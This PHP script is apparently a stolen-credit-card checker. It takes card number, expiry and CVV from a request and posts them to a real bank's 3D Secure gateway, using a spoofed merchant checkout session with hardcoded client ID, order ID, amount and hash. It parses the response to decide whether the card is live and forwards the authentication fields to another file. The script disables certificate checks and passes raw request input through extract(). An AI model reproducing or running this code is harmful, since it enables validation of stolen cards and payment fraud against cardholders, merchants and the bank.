<?php

// error_reporting(0);
$start_time = microtime(true); 
extract($_REQUEST);

$what_3ds = False;
if (@$tds == 'on'){
	$what_3ds = True;
}

if (@$lista == ''){
	exit('Lista em branco');
}
list($cc, $mm, $yy, $cvv) = explode('|', $lista);
if (strlen($mm)==1){
	$mm = "0$mm";
}
if (strlen($yy)==2){
	$yy = "20$yy";
}
// if (strlen($yy) == 4){
//    $yy = $yy[2].$yy[3]; 
// }
$ch = curl_init();
$cid = round(microtime(true) * 1000);


$proxy = '';

$url = "https://sanalpos2.ziraatbank.com.tr/fim/est3Dgate";
$post = 'pan='.$cc.'&Ecom_Payment_Card_ExpDate_Month='.$mm.'&Ecom_Payment_Card_ExpDate_Year='.$yy.'&cv2='.$cvv.'&clientid=190024453&oid=1973182269011242&amount=464.85&okUrl=https%3A%2F%2Fgap.com.tr%2Forders%2Fcheckout%2F%3Fthree_d_secure%3Dtrue%26success%3Dtrue%26page%3DCreditCardThreeDSecurePage&failUrl=https%3A%2F%2Fgap.com.tr%2Forders%2Fcheckout%2F%3Fthree_d_secure%3Dtrue%26success%3Dfalse%26page%3DCreditCardThreeDSecurePage&storetype=3D&rnd=UAn4ZyVSxpsQ&hash=uxLjnlKi1FgvYUvD55wOrDPa%2Fy4%3D&currency=949&hashAlgorithm=ver1';
curl_setopt_array($ch, array(
	CURLOPT_URL => $url,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => false,
	CURLOPT_POST => True,
	CURLOPT_POSTFIELDS => $post,
	CURLOPT_PROXY => $proxy,
	CURLOPT_ENCODING => '',
	CURLOPT_COOKIESESSION => 1,
	CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_HTTPHEADER => array(
		'Cache-Control: max-age=0',
		'Upgrade-Insecure-Requests: 1',
		'Origin: https://gap.com.tr',
		'Content-Type: application/x-www-form-urlencoded',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Referer: https://gap.com.tr/orders/redirect-three-d/',
		'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	)
));
$result = curl_exec($ch);
if (strpos($result, 'hidden" name="PaReq" value="') !== false && strpos($result, 'hidden" name="TermUrl" value="') !== false && strpos($result, 'hidden" name="MD" value="') !== false){
	$PaReq = explode('"', explode('hidden" name="PaReq" value="', $result)[1])[0];
	$TermUrl = explode('"', explode('hidden" name="TermUrl" value="', $result)[1])[0];
	$MD = explode('"', explode('hidden" name="MD" value="', $result)[1])[0];
	include_once("pan_extra.php");
} else {
	exit('Cartão inexistente');
}
